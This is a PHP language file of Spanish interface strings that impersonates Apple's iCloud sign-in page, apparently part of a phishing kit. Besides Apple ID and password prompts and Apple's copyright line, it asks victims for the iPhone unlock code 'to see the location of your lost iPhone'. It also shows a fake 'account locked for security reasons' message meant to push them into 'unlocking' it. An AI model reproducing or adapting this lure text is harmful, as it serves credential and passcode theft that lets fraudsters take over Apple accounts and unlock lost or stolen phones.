<?php

/* MIOS */
// PATRON
$lang = array();
$lang['TTILE'] = 'iCloud';
$lang['DESCRIP'] = 'Inicia sesión en iCloud para acceder a tus fotos, vídeos, documentos, notas, contactos y mucho más. Usa tu ID de Apple o crea una cuenta para empezar a usar los servicios de Apple.';
$lang['DESCARGA'] = 'Descarga iCloud para Windows';
$lang['ACTULIZADO'] = 'Mantén actualizada la última versión de todos tus documentos, vídeos, fotos y mucho más, en tu PC.';
$lang['DESCARGA_AHORA'] = 'Descargar ahora';


//Header
$lang['CREAR_ID_APPLE'] = 'Crear ID de Apple';
$lang['ESTADO_SISTEMA'] = 'Estado del sistema';
 
$lang['POLICY'] = 'Política de privacidad';
$lang['TERMS'] = 'Términos y condiciones';
$lang['COPYRIGHT'] = 'Copyright © 2021 Apple Inc. Todos los derechos reservados';


$lang['COD_BLOQUEO'] = 'Ingrese su código de desbloqueo';
$lang['INCORRECTO'] = 'Código de bloqueo incorrecto.';
$lang['COMENTARIO'] = 'Introduce su código de bloqueo para ver la localización de su iPhone perdido.';

$lang['NO_CODIGO'] = '¿No recuerda su código?';


$lang['BLOQ_SEGURIDAD'] = 'Este ID de Apple se ha bloqueado por motivos de seguridad.';
$lang['COM_DEB_CUENTA'] = 'Antes de poder iniciar sesi&oacute;n tienes que desbloquear la cuenta.';
$lang['DEB_CUENTA'] = 'Desbloquear cuenta';



$lang['VERIFI_PATRON'] = 'Verificando…';



//DATOS 

$lang['SIGN_IN_TITLE'] = 'Iniciar sesión en iCloud';
$lang['APPLE_ID'] = 'ID de Apple';


$lang['PASSWORD'] = 'Contraseña';
$lang['APPLE_INCORRECTO'] = 'La contraseña o el ID de Apple son incorrectos.';
$lang['FORGOT_ID'] = '¿Has olvidado la contraseña?';
$lang['PER_CONECTADO'] = 'Permanecer Conectado';
$lang['OLVIDADO'] = '¿Has olvidado tu ID de Apple o la contraseña?';

?>